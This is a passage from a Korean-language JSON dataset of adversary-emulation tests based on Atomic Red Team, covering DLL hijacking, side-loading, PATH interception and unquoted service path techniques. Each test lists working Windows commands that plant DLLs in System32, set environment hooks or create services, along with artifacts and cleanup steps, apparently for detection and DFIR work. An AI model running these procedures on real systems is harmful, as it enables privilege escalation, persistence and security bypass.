        "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore 명령으로 ngrok 디렉터리와 관련 파일을 삭제한다.",
        "Remove-Item %USERPROFILE%\\AppData\\Local\\ngrok -ErrorAction Ignore 명령으로 로컬 ngrok 설정 디렉터리를 제거한다.",
        "실행 중인 ngrok 관련 PowerShell 잡이나 프로세스가 남아 있지 않은지 확인하고, 필요 시 수동으로 종료한다."
      ],

      "metadata": {
        "atomic_source_id": "4cdc9fc7-53fb-4894-9f0c-64836943ea60"
      }
    }
  ]
},
{
  "technique_id": "T1574.001",
  "technique_name": "Hijack Execution Flow: DLL",
  "tactic": "Privilege Escalation",

  "description": "DLL 하이재킹은 애플리케이션의 DLL 검색 순서 또는 로딩 메커니즘을 악용해 공격자가 지정한 DLL을 먼저 로드하도록 만드는 기법이다. 이를 통해 정상 프로세스 컨텍스트에서 임의 코드를 실행하거나, 보안 기능(예: AMSI)을 우회하고, 시스템/사용자 권한을 상승시키는 데 활용된다. Phantom DLL, 사이드로딩, 환경 변수 기반 로딩 등 다양한 변종이 존재한다.",

  "tests": [
    {
      "test_id": "T1574.001-1",
      "name": "DLL Search Order Hijacking - amsi.dll",
      "platforms": ["windows"],

      "summary": "PowerShell 실행 파일을 다른 이름(updater.exe)으로 복사하고 동일 디렉터리에 amsi.dll을 배치해 검색 순서를 악용하는 DLL 검색 순서 하이재킹 시나리오이다. 비표준 경로에서 amsi.dll을 로드하도록 유도해 AMSI 우회 가능성을 검증한다.",

      "procedure": [
        "%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe를 %APPDATA%\\updater.exe로 복사한다.",
        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사해 updater.exe와 같은 디렉터리에 둔다.",
        "%APPDATA%\\updater.exe -Command exit 를 실행해 검색 순서에 따라 %APPDATA%\\amsi.dll이 로드되는지 확인한다.",
        "DFIR 관점에서 새 위치의 updater.exe 및 amsi.dll 생성 여부와 해당 경로에서의 모듈 로딩 흔적을 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\r\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\n%APPDATA%\\updater.exe -Command exit"
        }
      ],

      "prerequisites": [
        "테스트를 수행하는 시스템에 PowerShell이 기본 경로(%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe)에 존재해야 한다.",
        "%windir%\\System32\\amsi.dll 파일이 존재해야 한다.",
        "%APPDATA% 경로에 파일을 쓰기 위한 권한(일반적으로 현재 사용자 권한)이 필요하다.",
        "updater.exe 실행 시 AMSI 관련 모듈 로딩이 발생하는 환경에서 수행하는 것이 우회 여부 확인에 유리하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\updater.exe",
            "description": "원본 powershell.exe를 복사해 만든 실행 파일로, 비표준 경로에서 amsi.dll을 로드하는 데 사용된다."
          },
          {
            "path": "%APPDATA%\\amsi.dll",
            "description": "DLL 검색 순서 하이재킹을 위해 %APPDATA% 경로에 복사된 amsi.dll"
          }
        ],
        "files_read": [
          {
            "path": "%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe",
            "description": "%APPDATA%\\updater.exe로 복사되는 원본 PowerShell 실행 파일"
          },
          {
            "path": "%windir%\\System32\\amsi.dll",
            "description": "%APPDATA%\\amsi.dll로 복사되는 원본 AMSI 라이브러리"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "updater.exe",
            "description": "powershell.exe를 복사·이름 변경한 프로세스로, 자신의 디렉터리에서 amsi.dll을 우선 로드하려고 시도한다.",
            "commandline_pattern": "%APPDATA%\\updater.exe -Command exit"
          }
        ],
        "network": []
      },

      "cleanup": [
        "%APPDATA%\\updater.exe 파일을 삭제한다.",
        "%APPDATA%\\amsi.dll 파일을 삭제한다."
      ],

      "metadata": {
        "atomic_source_id": "8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3"
      }
    },
    {
      "test_id": "T1574.001-2",
      "name": "Phantom DLL Hijacking - WinAppXRT.dll",
      "platforms": ["windows"],

      "summary": ".NET 구성 요소가 APPX_PROCESS 환경 변수를 참조해 WinAppXRT.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 기반으로 한 WinAppXRT.dll을 사용자 프로파일 및 system32 경로에 배치하고 APPX_PROCESS 값을 설정하여, .NET 애플리케이션 실행 시 공격자가 지정한 DLL을 자동 로드하도록 유도한다.",

      "procedure": [
        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다.",
        "%APPDATA%\\amsi.dll 파일 이름을 WinAppXRT.dll로 변경한다.",
        "변경된 %APPDATA%\\WinAppXRT.dll을 %windir%\\System32\\WinAppXRT.dll로 복사한다.",
        "reg add 명령을 사용해 HKEY_CURRENT_USER\\Environment 키에 APPX_PROCESS 값(REG_EXPAND_SZ, 데이터 \"1\")을 추가한다.",
        ".NET 기반 애플리케이션을 실행해 WinAppXRT.dll이 system32 및 PATH 상 위치에서 로드되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll WinAppXRT.dll\r\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\r\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f"
        }
      ],

      "prerequisites": [
        "%windir%\\System32\\amsi.dll이 존재해야 한다.",
        "%APPDATA% 및 %windir%\\System32 경로에 파일을 쓰고 복사할 수 있는 권한(관리자 권한)이 필요하다.",
        "HKEY_CURRENT_USER\\Environment 키에 값을 추가할 수 있어야 한다.",
        "테스트 후 .NET 애플리케이션을 실행해 WinAppXRT.dll 로딩 동작을 관찰할 수 있는 환경이 필요하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\WinAppXRT.dll",
            "description": "amsi.dll에서 이름을 변경해 생성된 팬텀 WinAppXRT.dll"
          },
          {
            "path": "%windir%\\System32\\WinAppXRT.dll",
            "description": ".NET 애플리케이션 실행 시 PATH 상에서 로드될 수 있는 위치에 복사된 WinAppXRT.dll"
          }
        ],
        "files_read": [
          {
            "path": "%windir%\\System32\\amsi.dll",
            "description": "팬텀 WinAppXRT.dll을 만들기 위해 복사되는 원본 amsi.dll"
          }
        ],
        "registry_keys": [
          {
            "path": "HKEY_CURRENT_USER\\Environment",
            "description": "APPX_PROCESS 환경 변수가 추가된 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "copy, ren, reg add 명령을 통해 DLL 및 레지스트리 조작을 수행하는 명령 프롬프트",
            "commandline_pattern": "copy %windir%\\System32\\amsi.dll * ren %APPDATA%\\amsi.dll WinAppXRT.dll * reg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS *"
          }
        ],
        "network": []
      },

      "cleanup": [
        "reg delete \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /f 명령으로 APPX_PROCESS 값을 제거한다.",
        "%windir%\\System32\\WinAppXRT.dll 파일을 삭제한다.",
        "%APPDATA%\\WinAppXRT.dll 파일을 삭제한다."
      ],

      "metadata": {
        "atomic_source_id": "46ed938b-c617-429a-88dc-d49b5c9ffedb"
      }
    },
    {
      "test_id": "T1574.001-3",
      "name": "Phantom DLL Hijacking - ualapi.dll",
      "platforms": ["windows"],

      "summary": "인쇄 스풀러(Print Spooler) 서비스가 시작될 때 system32의 ualapi.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 ualapi.dll로 위장해 system32에 배치하고 Spooler 서비스를 자동 시작으로 설정하여, 시스템 시작 시 악성 ualapi.dll이 로드되도록 한다.",

      "procedure": [
        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다.",
        "%APPDATA%\\amsi.dll 파일 이름을 ualapi.dll로 변경한다.",
        "변경된 %APPDATA%\\ualapi.dll을 %windir%\\System32\\ualapi.dll로 복사한다.",
        "sc config Spooler start=auto 명령을 실행해 Print Spooler 서비스를 자동 시작으로 설정한다.",
        "시스템 재부팅 후 또는 Spooler 서비스 재시작 시 system32\\ualapi.dll이 로드되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll ualapi.dll\r\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\r\nsc config Spooler start=auto"
        }
      ],

      "prerequisites": [
        "%windir%\\System32\\amsi.dll이 존재해야 한다.",
        "%APPDATA% 및 %windir%\\System32에 파일을 작성할 수 있는 관리자 권한이 필요하다.",
        "sc 명령으로 Spooler 서비스 구성을 변경할 수 있어야 한다.",
        "시스템 재부팅 또는 Spooler 서비스 재시작이 가능한 테스트 환경이어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\ualapi.dll",
            "description": "amsi.dll을 이름 변경해 생성된 팬텀 ualapi.dll"
          },
          {
            "path": "%windir%\\System32\\ualapi.dll",
            "description": "시스템 시작/Spooler 시작 시 로드될 수 있도록 system32에 배치된 ualapi.dll"
          }
        ],
        "files_read": [
          {
            "path": "%windir%\\System32\\amsi.dll",
            "description": "팬텀 ualapi.dll을 만들기 위해 복사되는 원본 amsi.dll"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler",
            "description": "sc config 명령에 의해 시작 유형(Start)이 auto로 설정된 인쇄 스풀러 서비스 구성 키"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "copy, ren, sc config 명령을 실행하는 명령 프롬프트",
            "commandline_pattern": "copy %windir%\\System32\\amsi.dll * ren %APPDATA%\\amsi.dll ualapi.dll * sc config Spooler start=auto"
          }
        ],
        "network": []
      },

      "cleanup": [
        "%windir%\\System32\\ualapi.dll 파일을 삭제한다.",
        "%APPDATA%\\ualapi.dll 파일을 삭제한다.",
        "Spooler 서비스 시작 유형은 auto 상태로 남으므로 필요 시 별도 명령으로 원래 설정으로 되돌려야 한다(자동 복원 기능은 제공되지 않는다)."
      ],

      "metadata": {
        "atomic_source_id": "5898902d-c5ad-479a-8545-6f5ab3cfc87f"
      }
    },
    {
      "test_id": "T1574.001-4",
      "name": "DLL Side-Loading using the Notepad++ GUP.exe binary",
      "platforms": ["windows"],

      "summary": "Notepad++ 업데이트에 사용되는 서명된 GUP.exe 바이너리를 이용해 DLL 사이드로딩을 수행하는 시나리오이다. 취약한 GUP.exe를 지정된 경로에 배치한 뒤 실행하여, 같은 디렉터리의 libcurl.dll 등 악성 DLL이 로드되도록 유도하고 최종적으로 calculator.exe(또는 지정한 프로세스)를 실행한다.",

      "procedure": [
        "테스트에 사용할 프로세스 이름(<process_name>)과 GUP 실행 파일 경로(<gup_executable>)를 결정한다.",
        "사전 조건에서 <gup_executable> 경로에 GUP.exe가 존재하는지 확인하고, 없으면 GitHub에서 다운로드해 배치한다.",
        "명령 프롬프트 또는 PowerShell에서 \"<gup_executable>\"을 실행한다.",
        "DLL 사이드로딩이 성공하면 지정된 프로세스(기본값 calculator.exe)가 생성되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"<gup_executable>\""
        }
      ],

      "prerequisites": [
        "<gup_executable> 위치에 서명된 GUP.exe 바이너리가 존재해야 한다(없을 경우 사전 준비 단계에서 GitHub에서 다운로드).",
        "사이드로딩 대상 DLL(예: libcurl.dll)이 GUP.exe와 동일한 디렉터리에 존재해야 악성 DLL이 로드된다.",
        "테스트 환경에서 Notepad++ 관련 파일 또는 Atomic Red Team에서 제공하는 GUP.exe를 사용하도록 설정해야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "<gup_executable>",
            "description": "Notepad++ 업데이트용 서명된 GUP.exe 바이너리(필요 시 원격에서 다운로드됨)"
          }
        ],
        "files_read": [
          {
            "path": "<gup_executable>",
            "description": "실행 시 같은 디렉터리의 DLL(libcurl.dll 등)을 로드하는 취약한 GUP.exe"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "GUP.exe",
            "description": "Notepad++ 서명된 업데이트 바이너리로, 실행 시 같은 폴더의 DLL을 사이드로딩한다.",
            "commandline_pattern": "*GUP.exe*"
          },
          {
            "name": "<process_name>",
            "description": "DLL 사이드로딩 성공 시 생성되는 프로세스(기본값 calculator.exe).",
            "commandline_pattern": "<process_name>"
          }
        ],
        "network": []
      },

      "cleanup": [
        "taskkill /F /IM <process_name> >nul 2>&1 명령으로 생성된 프로세스를 강제 종료한다.",
        "필요 시 테스트용 GUP.exe 및 사이드로딩 DLL을 저장한 디렉터리를 수동으로 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "65526037-7079-44a9-bda1-2cb624838040"
      }
    },
    {
      "test_id": "T1574.001-5",
      "name": "DLL Side-Loading using the dotnet startup hook environment variable",
      "platforms": ["windows"],

      "summary": "DOTNET_STARTUP_HOOKS 환경 변수를 사용해 .NET Core 애플리케이션 시작 시 특정 어셈블리(preloader.dll)의 메서드를 자동 실행하는 시나리오이다. dotnet -h 실행만으로도 preloader.dll이 로드되며, 이를 통해 .NET 프로세스 내부에서 악성 코드 실행이나 추가 DLL 사이드로딩을 수행할 수 있다.",

      "procedure": [
        "테스트에 사용할 프로세스 이름(<process_name>)과 preloader DLL 경로(<preloader_dll>)를 결정한다.",
        "사전 조건에서 .NET SDK가 설치되어 있는지(C:\\Program Files\\dotnet\\dotnet.exe) 확인하고, 없으면 winget을 통해 설치한다.",
        "<preloader_dll> 경로에 preloader.dll이 존재하지 않으면 GitHub에서 다운로드해 배치한다.",
        "명령 프롬프트에서 set DOTNET_STARTUP_HOOKS=\"<preloader_dll>\" 명령을 실행해 현재 세션의 환경 변수로 등록한다.",
        "dotnet -h > nul 명령을 실행해 .NET 도움말을 호출하면서 preloader.dll이 로드되도록 한다.",
        "preloader에 구성된 페이로드(예: calculator.exe 실행)가 정상적으로 수행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "set DOTNET_STARTUP_HOOKS=\"<preloader_dll>\"\r\ndotnet -h > nul\r\necho."
        }
      ],

      "prerequisites": [
        "C:\\Program Files\\dotnet\\dotnet.exe 경로에 .NET SDK가 설치되어 있어야 한다.",
        "<preloader_dll> 경로에 preloader.dll 파일이 존재해야 한다(없으면 GitHub에서 다운로드).",
        "환경 변수 DOTNET_STARTUP_HOOKS를 설정할 수 있는 콘솔 세션이 필요하다.",
        ".NET Core 애플리케이션(dotnet -h 포함)이 해당 세션에서 실행되어야 preloader.dll이 로드된다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "<preloader_dll>",
            "description": "DOTNET_STARTUP_HOOKS를 통해 로드되는 preloader.dll 어셈블리"
          }
        ],
        "files_read": [
          {
            "path": "<preloader_dll>",
            "description": ".NET 실행 시 시작 훅으로 로드되는 DLL"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "dotnet.exe",
            "description": "dotnet -h 실행 시 DOTNET_STARTUP_HOOKS에 지정된 preloader.dll을 로드하는 .NET 런타임 프로세스",
            "commandline_pattern": "dotnet -h *"
          },
          {
            "name": "<process_name>",
            "description": "preloader.dll 내부 로직에 의해 생성될 수 있는 프로세스(기본값 calculator.exe).",
            "commandline_pattern": "<process_name>"
          }
        ],
        "network": []
      },

      "cleanup": [
        "taskkill /F /IM <process_name> >nul 2>&1 명령으로 생성된 프로세스를 종료한다.",
        "현재 콘솔 세션을 종료하거나 DOTNET_STARTUP_HOOKS 환경 변수를 비워 후속 .NET 실행 시 preloader.dll이 로드되지 않도록 한다.",
        "필요 시 <preloader_dll> 파일을 삭제한다."
      ],

      "metadata": {
        "atomic_source_id": "d322cdd7-7d60-46e3-9111-648848da7c02"
      }
    },
    {
      "test_id": "T1574.001-6",
      "name": "DLL Search Order Hijacking / Sideloading of KeyScramblerIE.dll via KeyScrambler.exe",
      "platforms": ["windows"],

      "summary": "공식 KeyScrambler 설치 프로그램을 사용해 KeyScrambler를 설치한 뒤, KeyScrambler.exe를 TEMP 디렉터리로 복사해 실행하는 시나리오이다. 해당 실행 파일은 현재 작업 디렉터리에서 KeyScramblerIE.dll을 찾으므로, 공격자는 동일 폴더에 악성 KeyScramblerIE.dll을 배치해 DLL 사이드로딩 및 검색 순서 하이재킹을 수행할 수 있다.",

      "procedure": [
        "PowerShell에서 KeyScrambler 설치 프로그램을 공식 사이트에서 %TEMP%\\KeyScrambler_Setup.exe로 다운로드한다.",
        "다운로드한 설치 프로그램을 /S 옵션으로 무인 설치하여 C:\\Program Files (x86)\\KeyScrambler 아래에 KeyScrambler를 설치한다.",
        "설치된 C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe를 $env:TEMP\\KeyScrambler.exe로 복사해 권한 문제를 피한다.",
        "$env:TEMP\\KeyScrambler.exe를 실행하여 현재 디렉터리(TEMP)에서 KeyScramblerIE.dll을 찾도록 유도한다.",
        "KeyScramblerIE.dll이 없을 경우 누락 팝업이 표시되며, 실제 공격 시에는 동일 경로에 수정된 KeyScramblerIE.dll을 배치해 악성 코드 실행에 활용할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Write-Host 1.Downloading KeyScrambler from official website to temp directory\r\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\r\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\r\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\r\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\r\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\r\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\r\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\r\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker"
        }
      ],

      "prerequisites": [
        "인터넷 연결이 가능해야 하며, https://download.qfxsoftware.com 에 대한 접속이 허용되어야 한다.",
        "PowerShell에서 Invoke-WebRequest, Start-Process, Copy-Item을 실행할 수 있는 권한이 필요하다.",
        "KeyScrambler를 설치할 수 있는 관리자 권한이 필요하다.",
        "테스트 중 TEMP 디렉터리에서 KeyScrambler.exe가 실행될 수 있는 환경이어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\KeyScrambler_Setup.exe",
            "description": "공식 사이트에서 다운로드한 KeyScrambler 설치 프로그램"
          },
          {
            "path": "C:\\Program Files (x86)\\KeyScrambler",
            "description": "무인 설치(/S)로 생성된 KeyScrambler 설치 디렉터리와 관련 파일"
          },
          {
            "path": "%TEMP%\\KeyScrambler.exe",
            "description": "TEMP 디렉터리로 복사된 KeyScrambler 실행 파일로, 현재 작업 디렉터리에서 KeyScramblerIE.dll을 로드하려고 시도한다."
          }
        ],
        "files_read": [
          {
            "path": "%TEMP%\\KeyScrambler_Setup.exe",
            "description": "설치 과정에서 실행되는 KeyScrambler 설치 바이너리"
          },
          {
            "path": "C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe",
            "description": "TEMP 디렉터리로 복사되는 원본 KeyScrambler 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "KeyScrambler_Setup.exe",
            "description": "무인 설치 모드(/S)로 KeyScrambler를 설치하는 설치 프로그램",
            "commandline_pattern": "*KeyScrambler_Setup.exe /S*"
          },
          {
            "name": "KeyScrambler.exe",
            "description": "현재 디렉터리(TEMP)에서 KeyScramblerIE.dll을 찾으며, 악성 DLL이 존재할 경우 사이드로딩을 통해 실행할 수 있다.",
            "commandline_pattern": "*\\Temp\\KeyScrambler.exe*"
          },
          {
            "name": "powershell.exe",
            "description": "Invoke-WebRequest, Start-Process, Copy-Item 등을 사용해 다운로드·설치·복사를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "*KeyScrambler*"
          }
        ],
        "network": [
          {
            "remote_address": "download.qfxsoftware.com",
            "port": "443",
            "protocol": "HTTPS",
            "description": "공식 사이트에서 KeyScrambler 설치 프로그램을 다운로드하는 트래픽"
          }
        ]
      },

      "cleanup": [
        "팝업 창(누락된 KeyScramblerIE.dll)을 닫아 관련 프로세스를 종료한다.",
        "%TEMP%\\KeyScrambler_Setup.exe 파일을 삭제한다.",
        "\"C:\\Program Files (x86)\\KeyScrambler\\Uninstall.exe\" /S를 실행해 KeyScrambler를 제거한다.",
        "%TEMP%\\KeyScrambler.exe 파일을 삭제한다.",
        "필요 시 남아 있는 관련 로그 또는 레지스트리 항목을 추가로 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "c095ad8e-4469-4d33-be9d-6f6d1fb21585"
      }
    }
  ]
},
{
  "technique_id": "T1574.008",
  "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
  "tactic": "Privilege Escalation",

  "description": "경로 가로채기(Path Interception)는 실행 파일·스크립트의 검색 순서를 악용해 공격자가 배치한 바이너리를 먼저 실행시키는 기법이다. PowerShell, 기본 모듈, WindowsApps 등의 경로 검색 특성을 활용해 정상 명령과 동일한 이름의 악성 파일을 선행 경로에 두고 하이재킹한다. 이를 통해 재부팅 후에도 유지되는 지속성 확보 및 권한 상승·보안 우회에 활용된다.",

  "tests": [
    {
      "test_id": "T1574.008-1",
      "name": "PowerShell Persistence via hijacking default modules - Get-Variable.exe",
      "platforms": ["windows"],

      "summary": "Colibri 로더가 사용하는 기법을 모사해, PowerShell 기본 모듈 이름(Get-Variable.exe)과 동일한 이름의 실행 파일을 %LocalAppData%\\Microsoft\\WindowsApps 경로에 생성하는 시나리오이다. 이후 PowerShell -noprofile을 실행할 때 검색 순서를 악용해 공격자 바이너리가 먼저 호출되도록 하여, 계산기(calc)를 실행하는 형태의 지속성/하이재킹 동작을 시뮬레이션한다.",

      "procedure": [
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe( C# 컴파일러)가 존재하는지 확인한다.",
        "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs 소스 파일이 존재하는지 확인한다.",
        "csc.exe를 사용해 calc.cs를 컴파일하고, 출력 파일을 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe로 지정한다.",
        "PowerShell -noprofile을 실행해 기본 모듈 호출 과정에서 PATH/검색 순서에 의해 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe가 사용되는지(계산기 실행 여부) 확인한다.",
        "DFIR 관점에서 WindowsApps 폴더 내 Get-Variable.exe 생성 여부와 PowerShell 실행 시 해당 경로 참조 흔적을 수집한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile"
        }
      ],

      "prerequisites": [
        "시스템에 .NET Framework 4.x 및 C# 컴파일러(csc.exe)가 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe 경로에 설치되어 있어야 한다.",
        "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs C# 소스 파일이 존재해야 한다.",
        "현재 사용자 계정이 %LocalAppData%\\Microsoft\\WindowsApps 경로에 실행 파일을 생성할 수 있어야 한다.",
        "Windows 10 이상 환경에서 WindowsApps 경로 및 PowerShell 기본 모듈/명령 검색 순서가 Colibri 기법과 유사하게 동작하는 것이 이상적이다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe",
            "description": "PowerShell 기본 모듈 이름을 가장해 생성된 하이재킹용 실행 파일(여기서는 calc 실행용 샘플)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs",
            "description": "C# 컴파일에 사용된 소스 코드 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "csc.exe",
            "description": "calc.cs를 컴파일해 Get-Variable.exe를 생성하는 .NET C# 컴파일러 프로세스",
            "commandline_pattern": "csc.exe /out:*\\Microsoft\\WindowsApps\\Get-Variable.exe *calc.cs"
          },
          {
            "name": "powershell.exe",
            "description": "PowerShell -noprofile 실행 시 PATH/검색 순서를 통해 Get-Variable.exe를 호출할 수 있는 프로세스",
            "commandline_pattern": "Powershell -noprofile"
          },
          {
            "name": "calculator",
            "description": "하이재킹된 Get-Variable.exe 실행 결과로 생성되는 계산기 프로세스(샘플 페이로드)",
            "commandline_pattern": "*calculator*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore 명령으로 생성된 Get-Variable.exe를 삭제한다.",
        "Stop-Process -Name \"calculator\" 명령으로 실행 중인 계산기 프로세스를 종료한다.",
        "필요 시 WindowsApps 디렉터리에 유사한 이름의 의심스러운 실행 파일이 추가로 존재하지 않는지 점검한다."
      ],

      "metadata": {
        "atomic_source_id": "1561de08-0b4b-498e-8261-e922f3494aae"
      }
    }
  ]
},
{
  "technique_id": "T1574.009",
  "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
  "tactic": "Privilege Escalation",

  "description": "따옴표로 감싸지지 않은 서비스 실행 경로(Unquoted Service Path)는 경로에 공백이 포함되어 있을 때, Windows가 앞부분부터 순차적으로 실행 파일을 찾는 특성을 악용하는 기법이다. 공격자는 상위 디렉터리에 같은 이름의 실행 파일을 배치하여, 서비스가 SYSTEM 권한으로 잘못된 프로그램을 실행하도록 만들 수 있다. 이를 통해 권한 상승 및 지속성 확보에 활용된다.",

  "tests": [
    {
      "test_id": "T1574.009-1",
      "name": "Execution of program.exe as service with unquoted service path",
      "platforms": ["windows"],

      "summary": "공백이 포함된 서비스 실행 경로를 따옴표로 감싸지 않고 설정해 Unquoted Service Path 취약점을 유발하는 시나리오이다. C:\\Program Files\\windows_service.exe를 서비스 경로로 등록한 뒤 C:\\program.exe를 배치하여, 서비스 시작 시 실제로는 C:\\program.exe가 SYSTEM 권한으로 실행되는 동작을 모사한다.",

      "procedure": [
        "테스트에 사용할 서비스 실행 파일 경로(<service_executable>)를 확인한다(기본값: PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe).",
        "\"C:\\Program Files\\windows_service.exe\" 위치로 <service_executable>을 복사해 서비스용 실행 파일을 준비한다.",
        "\"C:\\program.exe\" 위치로 동일한 <service_executable>을 복사해 하이재킹용 실행 파일을 준비한다.",
        "sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto 명령으로 따옴표가 없는 경로를 가진 서비스를 생성한다.",
        "sc start \"Example Service\" 명령으로 서비스를 시작하여, 경로 파싱 특성에 의해 C:\\program.exe가 SYSTEM 권한으로 실행되는지 확인한다(예: C:\\Time.log 생성 여부 등)."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy \"<service_executable>\" \"C:\\Program Files\\windows_service.exe\"\r\ncopy \"<service_executable>\" \"C:\\program.exe\"\r\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\r\nsc start \"Example Service\""
        }
      ],

      "prerequisites": [
        "테스트용 실행 파일 <service_executable> (기본: PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe)이 존재해야 한다.",
        "C:\\Program Files 및 C:\\ 루트 경로에 파일을 생성·복사할 수 있는 관리자 권한이 필요하다.",
        "sc create, sc start 명령을 실행할 수 있는 권한(일반적으로 관리자 권한)이 필요하다.",
        "시스템 드라이브가 C:\\로 구성되어 있고, 서비스 경로에 공백이 포함된 환경에서 Unquoted Service Path 동작을 재현할 수 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Program Files\\windows_service.exe",
            "description": "서비스 등록에 사용되는 실행 파일(원본 <service_executable> 복사본)"
          },
          {
            "path": "C:\\program.exe",
            "description": "Unquoted Service Path 취약점을 악용하기 위해 C:\\ 루트에 배치된 하이재킹용 실행 파일"
          },
          {
            "path": "C:\\Time.log",
            "description": "WindowsServiceExample.exe가 실행되면서 생성할 수 있는 로그 파일(실제 페이로드 동작 검증용)"
          }
        ],
        "files_read": [
          {
            "path": "<service_executable>",
            "description": "C:\\Program Files 및 C:\\ 루트에 복사되는 원본 서비스 실행 파일"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Example Service",
            "description": "sc create 명령으로 생성된 서비스 레지스트리 키로, binPath 값에 따옴표가 없는 경로가 설정됨"
          }
        ],
        "processes": [
          {
            "name": "services.exe",
            "description": "Windows 서비스 관리자 프로세스로, Example Service를 시작할 때 실행 파일 경로를 해석한다.",
            "commandline_pattern": "services.exe"
          },
          {
            "name": "program.exe",
            "description": "Unquoted Service Path 취약점으로 인해 SYSTEM 권한으로 실행될 수 있는 C:\\program.exe",
            "commandline_pattern": "C:\\program.exe"
          },
          {
